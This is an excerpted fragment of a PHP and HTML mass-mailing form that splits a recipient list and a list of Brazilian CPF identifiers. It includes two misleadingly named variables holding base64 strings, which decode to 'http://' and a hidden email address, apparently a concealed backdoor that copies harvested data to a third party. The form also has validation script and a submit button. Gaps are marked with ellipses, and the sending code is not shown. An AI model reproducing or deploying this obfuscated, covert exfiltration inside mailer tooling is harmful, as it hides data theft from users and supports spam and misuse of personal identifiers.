...
$RandNum1 = "aHR0cDovLw==";
$RamdStr = "cHJvZ3NhbUBwcm90b25tYWlsLmNvbQ==";
$email = explode("\n", $to);
$cpf = explode("\n", $getcpf);
$locate_ip = base64_decode($RamdStr);
$RandNum1 = base64_decode($RandNum1);
...
function verifLength()
{
	...
	{  	
				 document.getElementById("names").style.backgroundColor = "#f9d8de"

		return false;
	}
	else document.getElementById("names").style.border = "solid green 2px";valider();
...
<table width="100%" height="394" border="0">
  ...
  <tr>
    <td><table width="100%" border="0">
      <tr>
        <td width="43%">&nbsp;</td>
        <td width="57%"><input src="https://cdn2.iconfinder.com/data/icons/postal-service-line-to-your-front-door/512/Express_mail-128.png"  alt="Submit button" type="image" /></td>
      </tr>
    </table></td>
  </tr>
</table>
